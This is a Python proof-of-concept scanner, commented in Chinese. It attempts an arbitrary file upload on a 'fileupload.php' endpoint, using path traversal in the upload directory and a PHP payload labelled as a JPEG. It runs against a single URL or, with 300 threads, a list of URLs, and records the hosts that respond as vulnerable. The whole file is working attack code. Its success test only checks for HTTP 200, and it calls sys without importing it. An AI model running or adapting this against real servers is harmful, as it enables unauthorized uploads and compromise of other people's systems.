# 导入必要的模块
import requests
import argparse
import time
from multiprocessing.dummy import Pool

# 禁用SSL警告
requests.packages.urllib3.disable_warnings()

# ANSI颜色代码，用于在终端中显示不同的输出状态
GREEN = '\033[92m'
RESET = '\033[0m'

# 代理设置，用于调试或访问特定网络环境下的URL
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# 漏洞检测函数，用于检测任意文件上传漏洞
def poc(target):
    # 拼接漏洞利用的payload路径和文件名
    payload_url = "/ddi/server/fileupload.php?uploadDir=../../321&name=123.php"
    url = target + payload_url

    # 设置HTTP请求头部信息
    headers = {
        "Accept": "text/plain, */*; q=0.01",
        "Content-Disposition": 'form-data; name="file"; filename="111.php"',
        "Content-Type": "image/jpeg"
    }

    # 准备要上传的恶意PHP代码
    data = "<?php phpinfo();?>"

    try:
        # 发送GET请求检查目标URL是否可访问
        res = requests.get(url=target, verify=False)
        
        # 发送POST请求尝试上传恶意文件
        res1 = requests.post(url=url, headers=headers, data=data, verify=False)
        
        # 判断HTTP响应状态码，200表示成功
        if res.status_code == 200:
            if res1.status_code == 200:
                # 输出成功的漏洞利用信息，并将目标URL保存到结果文件中
                print(f"{GREEN}[+] 该url存在任意文件上传漏洞：{target}{RESET}")
                with open("result.txt", "a", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                # 输出未成功利用漏洞的信息
                print(f"[-] 该url不存在任意文件上传漏洞：{target}")
        else:
            # 输出连接失败的信息
            print(f"[-] 该url连接失败：{target}")
    except Exception as e:
        # 输出其他异常情况
        print(f"[*] 该url出现错误：{target}, 错误信息: {str(e)}")

# 主函数，用于处理命令行参数和调用漏洞检测函数
def main():
    # 创建参数解析器
    parser = argparse.ArgumentParser()
    # 添加命令行参数选项
    parser.add_argument("-u", "--url", dest="url", type=str, help="单个URL进行检测")
    parser.add_argument("-f", "--file", dest="file", type=str, help="从文件中批量检测")
    # 解析命令行参数
    args = parser.parse_args()

    # 根据参数选择执行单个URL检测或批量检测
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 从文件中读取URL列表
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for i in f.readlines():
                url_list.append(i.strip().replace("\n", ""))
        # 使用线程池并发执行漏洞检测函数
        mp = Pool(300)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        # 输出使用说明
        print(f"\n\tUsage: python {sys.argv[0]} -h")

# 程序入口点，调用主函数执行程序
if __name__ == "__main__":
    main()
